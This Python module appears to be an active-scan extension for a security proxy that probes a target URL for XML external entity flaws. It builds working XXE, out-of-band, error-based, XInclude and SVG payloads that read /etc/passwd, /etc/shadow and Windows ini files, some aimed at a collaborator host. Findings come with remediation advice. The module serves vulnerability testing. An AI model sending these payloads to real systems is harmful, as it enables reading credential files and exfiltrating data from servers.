"""XXE Advanced — OOB XXE with external DTD, blind XXE via error messages, and XInclude injection."""

from __future__ import annotations

import logging
import uuid
from typing import Any
from urllib.parse import urlparse

import httpx

from models import ScanFinding

log = logging.getLogger("proxy-engine.ext.xxe-advanced")

NAME = "xxe-advanced"
DESCRIPTION = "OOB XXE (external DTD), blind XXE (error-based), XInclude injection"
CHECK_TYPE = "active"
ENABLED = False

_config: dict[str, Any] = {
    "timeout": 15.0,
    "collaborator": "collab.example.com",
}

# Files to attempt reading
TARGET_FILES = [
    "/etc/passwd",
    "/etc/hostname",
    "C:\\Windows\\system.ini",
    "C:\\Windows\\win.ini",
    "/etc/shadow",
]

# Error indicators for blind XXE
XXE_ERROR_INDICATORS = [
    "SYSTEM", "ENTITY", "DOCTYPE",
    "Root element", "root element",
    "xml version", "parser error",
    "xml parsing error", "xmlParseEntityRef",
    "DOMDocument", "simplexml",
    "SAXParseException", "xmlSAXParseParsing",
    "org.xml.sax", "javax.xml",
    "com.sun.org.apache", "xerces",
    "lxml.etree", "expat",
]


def configure(config: dict) -> dict:
    _config.update(config)
    return {"status": "configured", "config": _config}


def get_state() -> dict:
    return {"config": _config}


async def active_check(url: str) -> list[ScanFinding]:
    """Test for XXE vulnerabilities using multiple techniques."""
    findings: list[ScanFinding] = []
    timeout = _config.get("timeout", 15.0)
    collab = _config.get("collaborator", "collab.example.com")

    async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
        # Test 1: Classic XXE with file read
        findings.extend(await _test_classic_xxe(client, url))

        # Test 2: OOB XXE with external DTD
        findings.extend(await _test_oob_xxe(client, url, collab))

        # Test 3: Blind XXE via error-based exfiltration
        findings.extend(await _test_blind_xxe_error(client, url, collab))

        # Test 4: XInclude injection
        findings.extend(await _test_xinclude(client, url))

        # Test 5: XXE via SVG upload
        findings.extend(await _test_svg_xxe(client, url))

        # Test 6: XXE via different Content-Types
        findings.extend(await _test_content_type_xxe(client, url))

    return findings


async def _test_classic_xxe(
    client: httpx.AsyncClient, url: str
) -> list[ScanFinding]:
    """Classic XXE: inline DTD with ENTITY for local file read."""
    findings: list[ScanFinding] = []

    for target_file in TARGET_FILES:
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{target_file}"> ]>\n'
            '<root><data>&xxe;</data></root>'
        )

        try:
            resp = await client.post(
                url,
                content=payload.encode(),
                headers={"Content-Type": "application/xml"},
            )

            body = resp.text[:10000]

            # Check for file contents
            file_indicators = {
                "/etc/passwd": ["root:x:0:0:", "root:*:0:0:", "/bin/bash", "/bin/sh"],
                "/etc/hostname": [],
                "system.ini": ["[drivers]", "[386Enh]", "[boot]"],
                "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
                "/etc/shadow": ["root:$", "root:!"],
            }

            for file_path, indicators in file_indicators.items():
                if file_path in target_file:
                    if indicators:
                        for indicator in indicators:
                            if indicator in body:
                                findings.append(ScanFinding(
                                    template_id="xxe_file_read",
                                    name=f"XXE: Local File Read ({target_file})",
                                    severity="critical",
                                    url=url,
                                    matched_at=url,
                                    description=(
                                        f"XXE vulnerability confirmed. Successfully read '{target_file}' "
                                        f"via XML external entity injection. Indicator: '{indicator}'"
                                    ),
                                    extracted=[
                                        f"File: {target_file}",
                                        f"Indicator: {indicator}",
                                        f"Response excerpt: {body[:500]}",
                                    ],
                                    source="extension",
                                    confidence="confirmed",
                                    remediation=(
                                        "Disable external entity processing in XML parser. "
                                        "Set XMLConstants.FEATURE_SECURE_PROCESSING = true. "
                                        "Use defusedxml (Python), OWASP XXE Prevention Cheat Sheet."
                                    ),
                                ))
                                return findings
                    break

        except Exception as e:
            log.debug(f"Classic XXE test error ({target_file}): {e}")

    return findings


async def _test_oob_xxe(
    client: httpx.AsyncClient, url: str, collab: str
) -> list[ScanFinding]:
    """OOB XXE: exfiltrate data via external DTD to collaborator."""
    findings: list[ScanFinding] = []
    tag = f"xxe-oob-{uuid.uuid4().hex[:8]}"

    # External DTD payload
    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{collab}/{tag}"> %xxe; ]>\n'
        '<root><data>test</data></root>'
    )

    try:
        resp = await client.post(
            url,
            content=payload.encode(),
            headers={"Content-Type": "application/xml"},
        )

        body = resp.text[:5000].lower()

        # Check for OOB indicators
        if any(ind.lower() in body for ind in XXE_ERROR_INDICATORS):
            findings.append(ScanFinding(
                template_id="xxe_oob_indicator",
                name="XXE: OOB DTD Processing Indicator",
                severity="high",
                url=url,
                matched_at=url,
                description=(
                    f"Server processed external DTD reference. XML parser error messages "
                    f"indicate entity processing is enabled. Check collaborator ({collab}) "
                    f"for OOB callback with tag '{tag}'."
                ),
                extracted=[
                    f"Collaborator: {collab}",
                    f"OOB tag: {tag}",
                    f"Response status: {resp.status_code}",
                ],
                source="extension",
                confidence="firm",
                remediation="Disable external entity and DTD processing in XML parser.",
            ))

    except Exception as e:
        log.debug(f"OOB XXE test error: {e}")

    # Parameter entity with data exfiltration
    for target_file in TARGET_FILES[:2]:
        exfil_tag = f"xxe-exfil-{uuid.uuid4().hex[:8]}"
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY % file SYSTEM "file://{target_file}">\n'
            f'  <!ENTITY % dtd SYSTEM "http://{collab}/{exfil_tag}">\n'
            '  %dtd;\n'
            ']>\n'
            '<root><data>&send;</data></root>'
        )

        try:
            await client.post(
                url,
                content=payload.encode(),
                headers={"Content-Type": "application/xml"},
            )
        except Exception:
            pass

    return findings


async def _test_blind_xxe_error(
    client: httpx.AsyncClient, url: str, collab: str
) -> list[ScanFinding]:
    """Blind XXE: trigger error messages that leak file contents."""
    findings: list[ScanFinding] = []

    # Force a parsing error that includes file content
    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
        '  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">\n'
        '  %eval;\n'
        '  %error;\n'
        ']>\n'
        '<root><data>test</data></root>'
    )

    try:
        resp = await client.post(
            url,
            content=payload.encode(),
            headers={"Content-Type": "application/xml"},
        )

        body = resp.text[:10000]
        if "root:x:0:0:" in body or "root:*:0:0:" in body:
            findings.append(ScanFinding(
                template_id="xxe_blind_error",
                name="XXE: Blind Error-Based File Exfiltration",
                severity="critical",
                url=url,
                matched_at=url,
                description=(
                    "Blind XXE confirmed. File contents exfiltrated via XML parser error messages. "
                    "/etc/passwd contents visible in error response."
                ),
                extracted=[
                    "Method: error-based exfiltration",
                    f"Response excerpt: {body[:500]}",
                ],
                source="extension",
                confidence="confirmed",
                remediation="Disable external entity processing. Suppress detailed XML parser errors.",
            ))

    except Exception as e:
        log.debug(f"Blind XXE error test: {e}")

    return findings


async def _test_xinclude(
    client: httpx.AsyncClient, url: str
) -> list[ScanFinding]:
    """XInclude injection in non-XML request bodies."""
    findings: list[ScanFinding] = []

    for target_file in TARGET_FILES[:2]:
        # XInclude without controlling the full XML document
        payload = (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include parse="text" href="file://{target_file}"/>'
            '</foo>'
        )

        content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
            "application/soap+xml",
        ]

        for ct in content_types:
            try:
                resp = await client.post(
                    url,
                    content=payload.encode(),
                    headers={"Content-Type": ct},
                )

                body = resp.text[:10000]
                file_indicators = ["root:x:0:0:", "root:*:0:0:", "[drivers]", "[fonts]"]

                for indicator in file_indicators:
                    if indicator in body:
                        findings.append(ScanFinding(
                            template_id="xxe_xinclude",
                            name=f"XInclude Injection: File Read ({target_file})",
                            severity="critical",
                            url=url,
                            matched_at=url,
                            description=(
                                f"XInclude injection allows reading local files. "
                                f"File: {target_file}. Content-Type: {ct}. "
                                f"Indicator: '{indicator}'"
                            ),
                            extracted=[
                                f"File: {target_file}",
                                f"Content-Type: {ct}",
                                f"Indicator: {indicator}",
                            ],
                            source="extension",
                            confidence="confirmed",
                            remediation="Disable XInclude processing. Configure XML parser securely.",
                        ))
                        return findings

            except Exception as e:
                log.debug(f"XInclude test error ({ct}): {e}")

    return findings


async def _test_svg_xxe(
    client: httpx.AsyncClient, url: str
) -> list[ScanFinding]:
    """Test XXE via SVG file upload."""
    findings: list[ScanFinding] = []

    svg_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
        '  <text x="0" y="50">&xxe;</text>\n'
        '</svg>'
    )

    try:
        resp = await client.post(
            url,
            content=svg_payload.encode(),
            headers={"Content-Type": "image/svg+xml"},
        )

        body = resp.text[:10000]
        if "root:x:0:0:" in body or "root:*:0:0:" in body:
            findings.append(ScanFinding(
                template_id="xxe_svg",
                name="XXE via SVG Upload",
                severity="critical",
                url=url,
                matched_at=url,
                description="XXE via SVG image. Server processes XML entities in SVG files.",
                extracted=[f"Response excerpt: {body[:500]}"],
                source="extension",
                confidence="confirmed",
                remediation="Sanitize SVG uploads. Strip DTD declarations and entity references.",
            ))

    except Exception as e:
        log.debug(f"SVG XXE test error: {e}")

    return findings


async def _test_content_type_xxe(
    client: httpx.AsyncClient, url: str
) -> list[ScanFinding]:
    """Test XXE by changing Content-Type to XML on non-XML endpoints."""
    findings: list[ScanFinding] = []

    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
        '<root><data>&xxe;</data></root>'
    )

    # Try converting a JSON endpoint to XML
    json_to_xml_types = [
        "application/xml",
        "text/xml",
    ]

    for ct in json_to_xml_types:
        try:
            resp = await client.post(
                url,
                content=payload.encode(),
                headers={"Content-Type": ct},
            )

            body = resp.text[:10000]
            if "root:x:0:0:" in body or "root:*:0:0:" in body:
                findings.append(ScanFinding(
                    template_id="xxe_content_type_swap",
                    name="XXE via Content-Type Swap",
                    severity="critical",
                    url=url,
                    matched_at=url,
                    description=(
                        f"Endpoint accepts XML via Content-Type: {ct} and processes entities. "
                        "Content-Type header swap from JSON to XML enables XXE."
                    ),
                    extracted=[f"Content-Type: {ct}", f"Response excerpt: {body[:500]}"],
                    source="extension",
                    confidence="confirmed",
                    remediation=(
                        "Validate Content-Type strictly. Only accept expected content types. "
                        "Disable XML entity processing."
                    ),
                ))
                return findings

            # Check for XML processing indicators
            if any(ind.lower() in body.lower() for ind in XXE_ERROR_INDICATORS):
                findings.append(ScanFinding(
                    template_id="xxe_content_type_swap_indicator",
                    name="XXE Indicator: XML Processing via Content-Type Swap",
                    severity="medium",
                    url=url,
                    matched_at=url,
                    description=(
                        f"Endpoint processes XML when Content-Type is set to {ct}. "
                        "XML parser error messages detected. XXE may be possible with further payloads."
                    ),
                    extracted=[f"Content-Type: {ct}"],
                    source="extension",
                    confidence="tentative",
                    remediation="Validate Content-Type strictly. Disable XML entity processing.",
                ))
                return findings

        except Exception as e:
            log.debug(f"Content-Type XXE test error ({ct}): {e}")

    return findings
